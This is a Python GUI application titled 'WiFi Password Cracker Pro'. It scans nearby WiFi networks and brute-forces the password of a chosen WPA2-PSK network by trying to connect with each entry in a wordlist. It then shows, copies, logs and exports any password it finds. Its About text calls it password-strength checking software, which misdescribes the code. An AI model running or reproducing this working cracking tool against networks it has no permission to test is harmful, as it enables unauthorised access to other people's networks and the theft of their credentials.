import time
import pywifi
from pywifi import const
import os
import sys
from tkinter import *
from tkinter import messagebox, ttk, colorchooser, filedialog
from threading import Timer
import pyperclip
import json
from datetime import datetime
import webbrowser

# Initialize theme variables
current_theme = {
    "light": {"bg": "#f5f5f5", "fg": "#000000", "button_bg": "#4CAF50", "button_fg": "white", "entry_bg": "white"},
    "dark": {"bg": "#2b2b2b", "fg": "#ffffff", "button_bg": "#388E3C", "button_fg": "white", "entry_bg": "#3b3b3b"}
}
is_dark_mode = False

# Initialize other global variables
available_devices = []
keys = []
final_output = {}
interface = None
root = None
top_frame = None
middle_frame = None
bottom_frame = None
network_listbox = None
file_entry = None
process_text = None
progress = None
status_var = None
status_label = None
status_bar = None

def check_wifi_interface():
    try:
        wifi = pywifi.PyWiFi()
        interfaces = wifi.interfaces()
        
        if not interfaces:
            messagebox.showerror("Error", "No WiFi interface found!")
            return None
        
        # Try to find an interface that's powered on
        for iface in interfaces:
            if iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_CONNECTED]:
                return iface
        
        # If no powered interface found, try to power on the first one
        interface = interfaces[0]
        try:
            interface.disconnect()  # Ensure clean state
            return interface
        except Exception as e:
            messagebox.showerror("Error", f"Failed to initialize WiFi interface: {e}")
            return None
            
    except Exception as e:
        messagebox.showerror("Error", f"Failed to initialize WiFi system: {e}")
        return None

def check_requirements():
    # Check if wordlist file exists
    wordlist_path = os.path.join(os.path.dirname(__file__), "wordlist.txt")
    if not os.path.exists(wordlist_path):
        messagebox.showerror("Error", "Wordlist file not found!")
        return False
    
    # Check write permissions for history and config
    try:
        with open("test_write.tmp", 'w') as f:
            f.write("test")
        os.remove("test_write.tmp")
    except Exception as e:
        messagebox.showerror("Error", "No write permission in current directory!")
        return False
    
    return True

def init_gui():
    global root, interface, style
    
    # Check system requirements first
    if not check_requirements():
        sys.exit(1)
    
    # Initialize GUI
    root = Tk()
    root.title("WiFi Password Cracker Pro")
    root.geometry("600x800")
    root.configure(bg=current_theme["light"]["bg"])
    
    # Initialize WiFi interface
    interface = check_wifi_interface()
    if not interface:
        root.destroy()
        sys.exit(1)
    
    # Setup style
    style = ttk.Style()
    style.theme_use('clam')
    style.configure("custom.Horizontal.TProgressbar",
                   troughcolor=current_theme["light"]["bg"],
                   background='#4CAF50',
                   thickness=20)
    
    # Create GUI elements
    create_frames()
    create_widgets()
    create_menu()
    setup_keyboard_shortcuts()
    
    # Load configuration at startup
    try:
        load_config()
    except Exception as e:
        print(f"Failed to load configuration: {e}")
    
    # Save configuration on exit
    root.protocol("WM_DELETE_WINDOW", lambda: [save_config(), root.destroy()])

def create_frames():
    global top_frame, middle_frame, bottom_frame
    
    top_frame = Frame(root, bg=current_theme["light"]["bg"])
    top_frame.pack(fill=X, padx=10, pady=5)
    
    middle_frame = Frame(root, bg=current_theme["light"]["bg"])
    middle_frame.pack(fill=X, padx=10, pady=5)
    
    bottom_frame = Frame(root, bg=current_theme["light"]["bg"])
    bottom_frame.pack(fill=X, padx=10, pady=5)

def create_widgets():
    global network_listbox, file_entry, process_text, progress, status_var, status_label, status_bar, scan_button, filter_button
    
    # Top frame widgets
    Label(top_frame, text="WiFi Password Cracker Pro", font=("Helvetica", 18, "bold"),
          bg=current_theme["light"]["bg"], fg=current_theme["light"]["fg"]).pack(pady=10)
    
    # Theme controls
    theme_frame = Frame(top_frame, bg=current_theme["light"]["bg"])
    theme_frame.pack(fill=X, pady=5)
    Button(theme_frame, text="Toggle Dark Mode", command=toggle_dark_mode).pack(side=LEFT, padx=5)
    Button(theme_frame, text="Custom Theme", command=choose_theme).pack(side=LEFT, padx=5)
    
    # Middle frame widgets
    Label(middle_frame, text="Available Networks:", bg=current_theme["light"]["bg"]).pack(pady=5)
    
    # Network frame
    network_frame = Frame(middle_frame, bg=current_theme["light"]["bg"])
    network_frame.pack(fill=X, pady=5)
    
    network_listbox = ttk.Treeview(network_frame, columns=("Signal", "Auth"), height=10)
    network_listbox.heading("#0", text="Network Name")
    network_listbox.heading("Signal", text="Signal Strength")
    network_listbox.heading("Auth", text="Authentication")
    network_listbox.column("#0", width=200)
    network_listbox.column("Signal", width=100)
    network_listbox.column("Auth", width=100)
    network_listbox.pack(side=LEFT, fill=X, expand=True)
    
    scrollbar = ttk.Scrollbar(network_frame, orient="vertical", command=network_listbox.yview)
    scrollbar.pack(side=RIGHT, fill=Y)
    network_listbox.configure(yscrollcommand=scrollbar.set)
    network_listbox.bind('<Double-Button-1>', show_network_details)
    
    scan_button = Button(middle_frame, text="Scan Networks", command=update_network_list,
                        bg=current_theme["light"]["button_bg"], fg="white")
    scan_button.pack(pady=5)
    
    filter_button = Button(middle_frame, text="Filter Networks", command=filter_networks,
                          bg=current_theme["light"]["button_bg"],
                          fg=current_theme["light"]["button_fg"])
    filter_button.pack(pady=5)
    
    # Password file frame
    file_frame = Frame(middle_frame, bg=current_theme["light"]["bg"])
    file_frame.pack(fill=X, pady=5)
    Label(file_frame, text="Password List:", bg=current_theme["light"]["bg"]).pack(side=LEFT, padx=5)
    file_entry = Entry(file_frame, width=40)
    file_entry.pack(side=LEFT, padx=5)
    file_entry.insert(0, os.path.join(os.path.dirname(__file__), "wordlist.txt"))
    Button(file_frame, text="Browse", command=browse_password_file).pack(side=LEFT, padx=5)
    
    # Action buttons
    Button(middle_frame, text="Start Cracking", command=start_cracking,
           bg=current_theme["light"]["button_bg"], fg="white").pack(pady=5)
    Button(middle_frame, text="Save Results", command=save_results,
           bg=current_theme["light"]["button_bg"], fg="white").pack(pady=5)
    
    # Progress and status
    progress = ttk.Progressbar(bottom_frame, style="custom.Horizontal.TProgressbar",
                              orient=HORIZONTAL, length=400, mode='determinate')
    progress.pack(pady=10)
    
    status_var = StringVar()
    status_label = Label(bottom_frame, textvariable=status_var, wraplength=500,
                        bg=current_theme["light"]["bg"], fg="green")
    status_label.pack(pady=5)
    
    # Process output
    process_text = Text(bottom_frame, width=60, height=10, wrap=WORD,
                       bg=current_theme["light"]["entry_bg"],
                       fg=current_theme["light"]["fg"])
    process_text.pack(pady=10)
    process_text.config(state=DISABLED)
    
    scrollbar = ttk.Scrollbar(bottom_frame, orient="vertical", command=process_text.yview)
    scrollbar.pack(side="right", fill="y")
    process_text.configure(yscrollcommand=scrollbar.set)
    
    # Add tooltips
    create_tooltip(scan_button, "Click to scan for available WiFi networks")
    create_tooltip(network_listbox, "Select a network to crack")
    create_tooltip(filter_button, "Filter networks by signal strength")
    create_tooltip(file_entry, "Enter the path to your password list file")
    
    # Status bar
    status_bar = Label(root, text="Ready", bd=1, relief=SUNKEN, anchor=W)
    status_bar.pack(side=BOTTOM, fill=X)

def show_network_details(event=None):
    selected_items = network_listbox.selection()
    if not selected_items:
        return
    
    selected_item = selected_items[0]
    network_name = network_listbox.item(selected_item)['text']
    signal = network_listbox.item(selected_item)['values'][0]
    auth = network_listbox.item(selected_item)['values'][1]
    
    details_window = Toplevel(root)
    details_window.title(f"Network Details - {network_name}")
    details_window.geometry("400x300")
    details_window.configure(bg=current_theme["light"]["bg"])
    
    Label(details_window, text="Network Details", font=("Helvetica", 14, "bold"),
          bg=current_theme["light"]["bg"]).pack(pady=10)
    
    details_frame = Frame(details_window, bg=current_theme["light"]["bg"])
    details_frame.pack(fill=BOTH, expand=True, padx=20, pady=10)
    
    Label(details_frame, text=f"SSID: {network_name}", bg=current_theme["light"]["bg"]).pack(anchor=W)
    Label(details_frame, text=f"Signal Strength: {signal}", bg=current_theme["light"]["bg"]).pack(anchor=W)
    Label(details_frame, text=f"Authentication: {auth}", bg=current_theme["light"]["bg"]).pack(anchor=W)
    
    Button(details_window, text="Start Cracking", command=lambda: [details_window.destroy(), start_cracking()],
           bg=current_theme["light"]["button_bg"], fg="white").pack(pady=10)

def save_network_profile():
    selected_items = network_listbox.selection()
    if not selected_items:
        messagebox.showerror("Error", "Please select a network to save")
        return
    
    selected_item = selected_items[0]
    network_data = {
        "ssid": network_listbox.item(selected_item)['text'],
        "signal": network_listbox.item(selected_item)['values'][0],
        "auth": network_listbox.item(selected_item)['values'][1]
    }
    
    filename = f"network_profile_{network_data['ssid']}.json"
    filepath = filedialog.asksaveasfilename(defaultextension=".json",
                                          initialfile=filename,
                                          filetypes=[("JSON files", "*.json")])
    if filepath:
        try:
            with open(filepath, 'w') as f:
                json.dump(network_data, f, indent=4)
            messagebox.showinfo("Success", "Network profile saved successfully")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save profile: {e}")

def load_network_profile():
    filepath = filedialog.askopenfilename(filetypes=[("JSON files", "*.json")])
    if filepath:
        try:
            with open(filepath, 'r') as f:
                network_data = json.load(f)
            network_listbox.insert('', 'end', text=network_data['ssid'],
                                 values=(network_data['signal'], network_data['auth']))
        except Exception as e:
            messagebox.showerror("Error", f"Failed to load profile: {e}")

def get_network_info(network):
    signal_strength = abs(network.signal)
    if signal_strength <= 50:
        strength = "Excellent"
    elif signal_strength <= 60:
        strength = "Good"
    elif signal_strength <= 70:
        strength = "Fair"
    else:
        strength = "Poor"
    
    auth_type = "Unknown"
    if network.akm[0] == const.AKM_TYPE_WPA2PSK:
        auth_type = "WPA2-PSK"
    elif network.akm[0] == const.AKM_TYPE_WPAPSK:
        auth_type = "WPA-PSK"
    
    return f"{network.ssid} | Signal: {strength} | Auth: {auth_type}"

def create_tooltip(widget, text):
    def show_tooltip(event):
        tooltip = Toplevel()
        tooltip.wm_overrideredirect(True)
        tooltip.wm_geometry(f"+{event.x_root+10}+{event.y_root+10}")
        
        label = Label(tooltip, text=text, justify=LEFT,
                     background="#ffffe0", relief=SOLID, borderwidth=1)
        label.pack()
        
        def hide_tooltip():
            tooltip.destroy()
        
        widget.tooltip = tooltip
        widget.bind('<Leave>', lambda e: hide_tooltip())
        
    widget.bind('<Enter>', show_tooltip)

def schedule_network_scan():
    Timer(30.0, update_network_list).start()  # Auto refresh every 30 seconds




def toggle_dark_mode():
    global is_dark_mode
    is_dark_mode = not is_dark_mode
    theme = current_theme["dark"] if is_dark_mode else current_theme["light"]
    update_theme(theme)

def choose_theme():
    color_code = colorchooser.askcolor(title="Choose color")
    if color_code[1]:  # Check if a color was selected
        theme = current_theme["dark"] if is_dark_mode else current_theme["light"]
        theme["bg"] = color_code[1]
        update_theme(theme)

def update_theme(theme):
    root.configure(bg=theme["bg"])
    for frame in [top_frame, middle_frame, bottom_frame]:
        frame.configure(bg=theme["bg"])
    
    for widget in root.winfo_children():
        if isinstance(widget, Frame):
            for child in widget.winfo_children():
                if isinstance(child, (Label, Text)):
                    child.configure(bg=theme["bg"], fg=theme["fg"])
                elif isinstance(child, Button):
                    child.configure(bg=theme["button_bg"], fg=theme["button_fg"])
                elif isinstance(child, Entry):
                    child.configure(bg=theme["entry_bg"], fg=theme["fg"])
                elif isinstance(child, Listbox):
                    child.configure(bg=theme["entry_bg"], fg=theme["fg"])

def save_results():
    if not final_output:
        messagebox.showwarning("Warning", "No results to save!")
        return
    
    filename = f"wifi_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    filepath = filedialog.asksaveasfilename(defaultextension=".json",
                                          initialfile=filename,
                                          filetypes=[("JSON files", "*.json")])
    if filepath:
        try:
            with open(filepath, 'w') as f:
                json.dump(final_output, f, indent=4)
            messagebox.showinfo("Success", f"Results saved to {filepath}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save results: {e}")

def browse_password_file():
    filename = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    if filename:
        file_entry.delete(0, END)
        file_entry.insert(0, filename)

def update_status(message, is_error=False):
    status_var.set(message)
    status_label.configure(fg="red" if is_error else "green")

# Function to scan for Wi-Fi networks
def scan_networks(interface):
    interface.scan()
    time.sleep(5)  # Wait for the scan to complete
    networks = interface.scan_results()
    return networks

# Function to attempt connecting to an open network
def connect_open_network(interface, ssid):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_NONE)
    interface.remove_all_network_profiles()
    interface.add_network_profile(profile)
    interface.connect(profile)
    time.sleep(4)
    return interface.status() == const.IFACE_CONNECTED

# Function to attempt connecting to a secured network with a password
def connect_secured_network(interface, ssid, password):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = password
    interface.remove_all_network_profiles()
    interface.add_network_profile(profile)
    interface.connect(profile)
    time.sleep(4)
    return interface.status() == const.IFACE_CONNECTED

# Function to update the list of available networks in the GUI
def create_scanning_animation():
    scanning_window = Toplevel(root)
    scanning_window.title("Scanning")
    scanning_window.geometry("300x150")
    scanning_window.configure(bg=current_theme["light"]["bg"])
    scanning_window.transient(root)
    scanning_window.grab_set()
    
    Label(scanning_window, text="Scanning for networks...",
          font=("Helvetica", 12), bg=current_theme["light"]["bg"]).pack(pady=20)
    
    progress = ttk.Progressbar(scanning_window, mode='indeterminate', length=200)
    progress.pack(pady=10)
    progress.start(10)
    
    return scanning_window

def filter_networks():
    filter_window = Toplevel(root)
    filter_window.title("Filter Networks")
    filter_window.geometry("300x200")
    filter_window.configure(bg=current_theme["light"]["bg"])
    
    var = StringVar(value="all")
    
    Label(filter_window, text="Filter by Signal Strength:",
          bg=current_theme["light"]["bg"]).pack(pady=10)
    
    Radiobutton(filter_window, text="All", variable=var, value="all",
                bg=current_theme["light"]["bg"]).pack()
    Radiobutton(filter_window, text="Excellent Only", variable=var, value="excellent",
                bg=current_theme["light"]["bg"]).pack()
    Radiobutton(filter_window, text="Good and Better", variable=var, value="good",
                bg=current_theme["light"]["bg"]).pack()
    
    def apply_filter():
        filter_type = var.get()
        items = network_listbox.get_children()
        for item in items:
            values = network_listbox.item(item)['values']
            if filter_type == "excellent" and values[0] != "Excellent":
                network_listbox.detach(item)
            elif filter_type == "good" and values[0] not in ["Excellent", "Good"]:
                network_listbox.detach(item)
            else:
                network_listbox.reattach(item, '', 'end')
        filter_window.destroy()
    
    Button(filter_window, text="Apply", command=apply_filter,
           bg=current_theme["light"]["button_bg"],
           fg=current_theme["light"]["button_fg"]).pack(pady=10)

def update_network_list():
    global available_devices
    scanning_window = create_scanning_animation()
    root.update()
    
    try:
        status_bar.config(text="Scanning for networks...")
        available_devices = scan_networks(interface)
        network_listbox.delete(*network_listbox.get_children())
        
        for network in available_devices:
            if network.ssid:
                signal_strength = abs(network.signal)
                if signal_strength <= 50:
                    strength = "Excellent"
                elif signal_strength <= 60:
                    strength = "Good"
                elif signal_strength <= 70:
                    strength = "Fair"
                else:
                    strength = "Poor"
                
                auth_type = "Unknown"
                if network.akm[0] == const.AKM_TYPE_WPA2PSK:
                    auth_type = "WPA2-PSK"
                elif network.akm[0] == const.AKM_TYPE_WPAPSK:
                    auth_type = "WPA-PSK"
                    
                network_listbox.insert('', 'end', text=network.ssid, 
                                     values=(strength, auth_type))
        
        status_bar.config(text=f"Found {len(network_listbox.get_children())} networks")
    except Exception as e:
        messagebox.showerror("Error", f"Failed to scan networks: {e}")
        status_bar.config(text="Network scan failed")
    finally:
        scanning_window.destroy()
    
    schedule_network_scan()

# Function to start the password cracking process
def start_cracking():
    selected_items = network_listbox.selection()
    if not selected_items:
        messagebox.showerror("Error", "Please select a WiFi network.")
        return
    
    selected_item = selected_items[0]
    selected_network = network_listbox.item(selected_item)['text']
    
    password_file = file_entry.get()
    if not os.path.isfile(password_file):
        messagebox.showerror("Error", f"File '{password_file}' not found.")
        return
    
    try:
        with open(password_file, 'r') as f:
            keys = [line.strip() for line in f]
    except Exception as e:
        messagebox.showerror("Error", f"Error reading password file: {e}")
        return
    
    progress['value'] = 0
    status_var.set("Cracking in progress...")
    process_text.config(state=NORMAL)
    process_text.delete(1.0, END)
    process_text.config(state=DISABLED)
    root.update_idletasks()
    
    total_passwords = len(keys)
    found_password = None
    
    for idx, password in enumerate(keys, 1):
        progress['value'] = (idx / total_passwords) * 100
        status_var.set(f"Trying password {idx}/{total_passwords}")
        update_process_text(f"Trying password ({idx}/{total_passwords}): {password}\n")

        root.update_idletasks()
        
        try:
            if connect_secured_network(interface, selected_network, password):
                found_password = password
                break
        except Exception as e:
            update_process_text(f"Error with password {password}: {str(e)}\n")
            continue
    
    if found_password:
        strength_score = calculate_password_strength(found_password)
        strength_label, color = get_strength_label(strength_score)
        final_output[selected_network] = found_password
        status_var.set(f"Success! Password found (Strength: {strength_label})")
        track_connection_attempt(selected_network, found_password, True)
        show_congratulation_popup(selected_network, found_password, strength_label)
    else:
        track_connection_attempt(selected_network, None, False)
        status_var.set(f"No valid password found for '{selected_network}'")

# Function to show congratulation popup
def calculate_password_strength(password):
    score = 0
    if len(password) >= 8:
        score += 1
    if any(c.isupper() for c in password):
        score += 1
    if any(c.islower() for c in password):
        score += 1
    if any(c.isdigit() for c in password):
        score += 1
    if any(not c.isalnum() for c in password):
        score += 1
    return score

def get_strength_label(score):
    if score <= 1:
        return "Very Weak", "red"
    elif score == 2:
        return "Weak", "orange"
    elif score == 3:
        return "Moderate", "yellow"
    elif score == 4:
        return "Strong", "light green"
    else:
        return "Very Strong", "dark green"

def track_connection_attempt(ssid, password, success):
    history_file = "connection_history.json"
    try:
        if os.path.exists(history_file):
            with open(history_file, 'r') as f:
                history = json.load(f)
        else:
            history = []
        
        history.append({
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ssid": ssid,
            "password": password if success else None,
            "success": success
        })
        
        with open(history_file, 'w') as f:
            json.dump(history, f, indent=4)
    except Exception as e:
        print(f"Error tracking connection: {e}")

def show_connection_history():
    history_window = Toplevel(root)
    history_window.title("Connection History")
    history_window.geometry("600x400")
    history_window.configure(bg=current_theme["light"]["bg"])
    
    tree = ttk.Treeview(history_window, columns=("Time", "Network", "Status"), height=15)
    tree.heading("#0", text="")
    tree.heading("Time", text="Time")
    tree.heading("Network", text="Network")
    tree.heading("Status", text="Status")
    
    tree.column("#0", width=0, stretch=NO)
    tree.column("Time", width=150)
    tree.column("Network", width=200)
    tree.column("Status", width=100)
    
    try:
        if os.path.exists("connection_history.json"):
            with open("connection_history.json", 'r') as f:
                history = json.load(f)
                for entry in reversed(history):
                    status = "Success" if entry["success"] else "Failed"
                    tree.insert("", 0, values=(entry["timestamp"], entry["ssid"], status))
    except Exception as e:
        messagebox.showerror("Error", f"Failed to load history: {e}")
    
    tree.pack(padx=10, pady=10, fill=BOTH, expand=True)

def show_congratulation_popup(ssid, password, strength_label):
    def on_ok():
        popup.destroy()

    popup = Toplevel(root)
    popup.title("Password Found")
    popup.geometry("300x200")
    popup.configure(bg=current_theme["bg"])

    Label(popup, text="Congratulations!", font=("Helvetica", 14, "bold"), bg=current_theme["bg"], fg=current_theme["fg"]).pack(pady=10)
    Label(popup, text=f"Password for '{ssid}' is:", font=("Helvetica", 12), bg=current_theme["bg"], fg=current_theme["fg"]).pack(pady=5)
    Label(popup, text=f"Password Strength: {strength_label}", font=("Helvetica", 12), bg=current_theme["bg"], fg=current_theme["fg"]).pack(pady=5)
    password_label = Label(popup, text=password, font=("Helvetica", 12, "bold"), bg=current_theme["bg"], fg="#4CAF50")
    password_label.pack(pady=5)

    Button(popup, text="Copy Password", command=lambda: copy_password(password), bg=current_theme["button_bg"], fg=current_theme["button_fg"]).pack(pady=5)
    Button(popup, text="OK", command=on_ok, bg=current_theme["button_bg"], fg=current_theme["button_fg"]).pack(pady=10)

# Function to copy the discovered password to clipboard
def copy_password(password):
    pyperclip.copy(password)
    messagebox.showinfo("Copied", "Password copied to clipboard!")

def show_about():
    about_window = Toplevel(root)
    about_window.title("About Us")
    about_window.geometry("500x400")
    about_window.configure(bg=current_theme["light"]["bg"])
    
    Label(about_window, text="About Us", 
          font=("Helvetica", 16, "bold"), 
          bg=current_theme["light"]["bg"]).pack(pady=10)
    
    desc_text = """Welcome to our Password Checking Software – a secure and reliable 
solution created to help users enhance their digital safety. Developed by 
Brajendra ., this tool is designed to check password strength and offer 
instant feedback to improve your online security.

Our goal is to promote better cybersecurity practices and help users 
protect their sensitive information with ease. The software is built 
using Python, ensuring a powerful yet user-friendly experience."""
    
    desc_label = Label(about_window, text=desc_text, 
                      bg=current_theme["light"]["bg"],
                      wraplength=400,
                      justify=LEFT)
    desc_label.pack(pady=10, padx=20)
    
    Label(about_window, text="For more updates and future projects, follow me on:", 
          font=("Helvetica", 12),
          bg=current_theme["light"]["bg"]).pack(pady=5)
    
    Label(about_window, text="🌐 Follow & Connect with Us:", 
          font=("Helvetica", 12, "bold"),
          bg=current_theme["light"]["bg"]).pack(pady=5)
    
    social_frame = Frame(about_window, bg=current_theme["light"]["bg"])
    social_frame.pack(fill=X, padx=20)
    
    social_links = [
        ("Telegram Channel →", "https://t.me/You_B_Tech"),
        ("YouTube →", "https://youtube.com/@You_B_Tech"),
        ("Instagram →", "https://instagram.com/you_b_tech")
    ]
    
    for platform, link in social_links:
        link_label = Label(social_frame, 
                          text=f"{platform} {link}",
                          bg=current_theme["light"]["bg"],
                          fg="#0066cc",
                          cursor="hand2")
        link_label.pack(anchor=W, pady=2)
        link_label.bind("<Button-1>", lambda e, url=link: webbrowser.open(url))

def show_help():
    help_text = """
    How to use:
    1. Click 'Scan Networks' to find available WiFi networks
    2. Select a network from the list
    3. Choose a password list file
    4. Click 'Start Cracking' to begin
    
    Shortcuts:
    Ctrl+S: Save results
    Ctrl+O: Open password file
    Ctrl+Q: Quit
    F5: Scan networks
    """
    help_window = Toplevel(root)
    help_window.title("Help")
    help_window.geometry("400x300")
    help_window.configure(bg=current_theme["light"]["bg"])
    
    help_text_widget = Text(help_window, wrap=WORD, bg=current_theme["light"]["bg"], 
         font=("Helvetica", 10))
    help_text_widget.insert('1.0', help_text)
    help_text_widget.pack(fill=BOTH, expand=True, padx=10, pady=10)

def save_config():
    config = {
        "theme": "dark" if is_dark_mode else "light",
        "window_size": root.geometry(),
        "last_password_file": file_entry.get(),
        "auto_refresh": True
    }
    try:
        with open('config.json', 'w') as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        messagebox.showerror("Error", f"Failed to save configuration: {e}")

def load_config():
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
            if config.get("theme") == "dark":
                toggle_dark_mode()
            if config.get("window_size"):
                root.geometry(config["window_size"])
            if config.get("last_password_file"):
                file_entry.delete(0, END)
                file_entry.insert(0, config["last_password_file"])
    except FileNotFoundError:
        pass
    except Exception as e:
        messagebox.showerror("Error", f"Failed to load configuration: {e}")

def export_results(format_type="txt"):
    if not final_output:
        messagebox.showwarning("Warning", "No results to export!")
        return
    
    if format_type == "txt":
        filetypes = [("Text files", "*.txt")]
        default_ext = ".txt"
    elif format_type == "csv":
        filetypes = [("CSV files", "*.csv")]
        default_ext = ".csv"
    else:
        filetypes = [("JSON files", "*.json")]
        default_ext = ".json"
    
    filename = f"wifi_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}{default_ext}"
    filepath = filedialog.asksaveasfilename(defaultextension=default_ext,
                                          initialfile=filename,
                                          filetypes=filetypes)
    if filepath:
        try:
            if format_type == "txt":
                with open(filepath, 'w') as f:
                    for ssid, password in final_output.items():
                        f.write(f"Network: {ssid}\nPassword: {password}\n\n")
            elif format_type == "csv":
                with open(filepath, 'w') as f:
                    f.write("Network,Password\n")
                    for ssid, password in final_output.items():
                        f.write(f"{ssid},{password}\n")
            else:
                with open(filepath, 'w') as f:
                    json.dump(final_output, f, indent=4)
            messagebox.showinfo("Success", f"Results exported to {filepath}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to export results: {e}")

def create_menu():
    menubar = Menu(root)
    root.config(menu=menubar)
    
    # File Menu
    file_menu = Menu(menubar, tearoff=0)
    menubar.add_cascade(label="File", menu=file_menu)
    file_menu.add_command(label="Open Password File", command=browse_password_file, accelerator="Ctrl+O")
    file_menu.add_command(label="Save Results", command=save_results, accelerator="Ctrl+S")
    file_menu.add_separator()
    file_menu.add_command(label="Save Network Profile", command=save_network_profile)
    file_menu.add_command(label="Load Network Profile", command=load_network_profile)
    file_menu.add_separator()
    export_menu = Menu(file_menu, tearoff=0)
    file_menu.add_cascade(label="Export Results", menu=export_menu)
    export_menu.add_command(label="as TXT", command=lambda: export_results("txt"))
    export_menu.add_command(label="as CSV", command=lambda: export_results("csv"))
    export_menu.add_command(label="as JSON", command=lambda: export_results("json"))
    file_menu.add_separator()
    file_menu.add_command(label="Exit", command=root.quit, accelerator="Ctrl+Q")
    
    # View Menu
    view_menu = Menu(menubar, tearoff=0)
    menubar.add_cascade(label="View", menu=view_menu)
    view_menu.add_command(label="Toggle Dark Mode", command=toggle_dark_mode)
    view_menu.add_command(label="Custom Theme", command=choose_theme)
    view_menu.add_separator()
    view_menu.add_command(label="Connection History", command=show_connection_history)
    
    # Help Menu
    help_menu = Menu(menubar, tearoff=0)
    menubar.add_cascade(label="Help", menu=help_menu)
    help_menu.add_command(label="Help Contents", command=show_help, accelerator="F1")
    help_menu.add_command(label="About", command=show_about)

def setup_keyboard_shortcuts():
    root.bind('<Control-s>', lambda e: save_results())
    root.bind('<Control-o>', lambda e: browse_password_file())
    root.bind('<Control-q>', lambda e: root.quit())
    root.bind('<F5>', lambda e: update_network_list())
    root.bind('<F1>', lambda e: show_help())
    root.bind('<Control-e>', lambda e: export_results("txt"))
    root.bind('<Control-Alt-s>', lambda e: save_config())
    root.bind('<Control-f>', lambda e: filter_networks())

# Function to update process text
def update_process_text(text):
    process_text.config(state=NORMAL)
    process_text.insert(END, text)
    process_text.see(END)
    process_text.config(state=DISABLED)



if __name__ == "__main__":
    init_gui()
    root.mainloop()

